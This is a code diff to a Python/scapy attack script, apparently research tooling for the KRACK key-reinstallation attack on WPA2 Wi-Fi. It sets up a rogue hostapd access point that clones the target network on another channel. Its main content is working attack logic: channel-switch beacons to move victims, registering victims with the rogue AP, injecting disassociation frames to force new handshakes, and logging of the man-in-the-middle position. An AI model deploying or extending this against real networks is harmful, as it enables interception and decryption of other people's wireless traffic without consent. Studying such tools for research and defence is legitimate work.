@@ -9,6 +9,10 @@ from wpaspy import Ctrl
 # TODO:
 # - Option to continously send CSA beacon frames on the real channel
 #
+# - Now we don't send deauth/disassoc to unknown STAs, we don't need to add all STAs to hostapd
+# - Try to keep mobile clients always awake. OR let the rogue hostapd send these, which will
+#	then properly handle any sleeping stations. OR at least display warnings when a station
+#   we are attacking is going to sleep.
 # - Victim client does not go through all stages. ClientState.GotMitm not set currently.
 # - If EAPOL-Msg4 has been received on the real channel, the attack has failed
 # - Detect when all frames are sent on the real channel, and if so, deauthenticate
@@ -185,12 +189,14 @@ def get_eapol_replaynum(p):
 def dot11_to_str(p):
 	EAP_CODE = {1: "Request"}
 	EAP_TYPE = {1: "Identity"}
+	DEAUTH_REASON = {1: "Unspecified", 2: "Prev_Auth_No_Longer_Valid", 4: "Inactivity", 6: "Unexp_Class2_Frame", 7: "Unexp_Class3_Frame", 8: "Leaving"}
+	dict_or_str = lambda d, v: d.get(v, str(v))
 	if p.type == 0:
 		if Dot11Beacon in p:     return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
 		if Dot11ProbeReq in p:   return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
 		if Dot11ProbeResp in p:  return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
 		if Dot11Auth in p:       return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
-		if Dot11Deauth in p:     return "Deauth(seq=%d, reason=%d)" % (dot11_get_seqnum(p), p[Dot11Deauth].reason)
+		if Dot11Deauth in p:     return "Deauth(seq=%d, reason=%s)" % (dot11_get_seqnum(p), dict_or_str(DEAUTH_REASON, p[Dot11Deauth].reason))
 		if Dot11AssoReq in p:    return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
 		if Dot11ReassoReq in p:  return "ReassoReq(seq=%d)" % dot11_get_seqnum(p)
 		if Dot11AssoResp in p:   return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
@@ -205,7 +211,7 @@ def dot11_to_str(p):
 		if p.subtype == 12:      return "QoS-Null(seq=%d)" % dot11_get_seqnum(p)
 		if EAPOL in p:
 			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
-			elif EAP in p:       return "EAP-%s,%s(seq=%d)" % (EAP_CODE.get(p[EAP].code, str(p[EAP].code)), EAP_TYPE.get(p[EAP].type, str(p[EAP].type)), dot11_get_seqnum(p))
+			elif EAP in p:       return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
 			else:                return repr(p)
 	return repr(p)			
 
@@ -243,7 +249,7 @@ def get_tlv_value(p, type):
 
 def print_rx(level, name, p, color=None, suffix=None):
 	if p[Dot11].type == 1: return
-	if color is None and Dot11Deauth in p: color="orange"
+	if color is None and (Dot11Deauth in p or Dot11Disas in p): color="orange"
 	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
 
 
@@ -408,6 +414,7 @@ class KRAckAttack():
 		self.apmac = None
 		self.netconfig = None
 		self.hostapd = None
+		self.hostapd_log = None
 
 		# This is set in case of targeted attacks
 		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
@@ -429,7 +436,7 @@ class KRAckAttack():
 		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))
 
 	def hostapd_add_sta(self, macaddr):
-		log(DEBUG, "Forwarding auth to rouge AP to register client")
+		log(DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
 		self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))
 
 	def hostapd_finish_4way(self, stamac):
@@ -515,19 +522,20 @@ class KRAckAttack():
 				self.send_csa_beacon()
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].update_state(ClientState.Connecting)
-
-				# TODO XXX FIXME TODO XXX FIXME
 				self.hostapd_add_sta(p.addr2)
-				#self.hostapd_rx_mgmt(p)
+
 			elif Dot11AssoReq in p:
-				# TODO: Do we really have to save it?
 				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p
 				self.hostapd_rx_mgmt(p)
 
-			# Clients sending a deauthentication to the real AP are also interesting ...
-			elif Dot11Deauth in p:
+			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
+			elif Dot11Deauth in p or Dot11Disas in p:
 				print_rx(INFO, "Real channel ", p)
 				if p.addr2 in self.clients: del self.clients[p.addr2]
+
+			# Display all frames sent from a MitM'ed client
+			elif p.addr2 in self.clients:
+				print_rx(INFO, "Real channel", p)
 
 			# For all other frames, only display them if they come from the targeted client
 			elif self.clientmac is not None and self.clientmac == p.addr2:
@@ -678,6 +686,22 @@ class KRAckAttack():
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
 			print_rx(INFO, "Rogue channel", p)
 
+	def handle_hostapd_out(self):
+		# hostapd always prints lines so this should not block
+		line = self.hostapd.stdout.readline()
+		if line == "":
+			log(ERROR, "Rogue hostapd instances unexpectedly closed")
+			quit(1)
+
+		if line.startswith(">>>> "):
+			log(STATUS, "Rogue hostapd: " + line[5:].strip())
+		# This is a bit hacky but very usefull for quick debugging
+		elif "sta_remove" in line or "Add STA" in line or "disassoc cb" in line or "disassocation: STA" in line or "fc=0xc0" in line:
+			log(DEBUG, "Rogue hostapd: " + line.strip())
+		else:
+			log(ALL, "Rogue hostapd: " + line.strip())
+
+		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line)
 
 	def run(self, strict_echo_test=False):
 		# Make sure to use a recent backports driver package so we can indeed
@@ -707,7 +731,7 @@ class KRAckAttack():
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
 
-		# Set BFP filters to increase performance
+		# Set BFP filters to increase performance -- FIXME this may increase speed, but dump pcap is less complete (not all ACKs included)
 		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
 		if self.clientmac:
 			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
@@ -718,11 +742,11 @@ class KRAckAttack():
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-		#self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd"])
+		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		self.hostapd_log = open("hostapd_rogue.log", "w")
 
-		log(STATUS, "Giving the rogue hostapd two second to initialize ...")
-		time.sleep(2)
+		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
+		time.sleep(1)
 
 		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
 		self.hostapd_ctrl.attach()
@@ -735,16 +759,18 @@ class KRAckAttack():
 
 		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
 		if self.clientmac is None: log(STATUS, "Note: no target client given, so cannot inject Disassociation to force new handshake(s)")
-		#else:                      self.queue_disas(self.clientmac) # TODO XXX FIXME TODO: Only do this if no traffic on rouge channel
+		#else:                      self.queue_disas(self.clientmac) # TODO XXX FIXME TODO: Queue this + only do this if no traffic on rouge channel
 
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
 		self.last_rogue_beacon = time.time()
 		nextbeacon = time.time() + 0.01
 		while True:
-			sel = select.select([self.sock_rogue, self.sock_real], [], [], 0.01)
-			if self.sock_real  in sel[0]: self.handle_rx_realchan()
-			if self.sock_rogue in sel[0]: self.handle_rx_roguechan()
+			sel = select.select([self.sock_rogue, self.sock_real, self.hostapd.stdout], [], [], 0.1)
+			if self.sock_real      in sel[0]: self.handle_rx_realchan()
+			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
+			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
+
 			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
 				self.send_disas(self.disas_queue.pop()[1])
 
@@ -765,6 +791,8 @@ class KRAckAttack():
 		if self.hostapd:
 			self.hostapd.terminate()
 			self.hostapd.wait()
+		if self.hostapd_log:
+			self.hostapd_log.close()
 		if self.sock_real: self.sock_real.close()
 		if self.sock_rogue: self.sock_rogue.close()
 
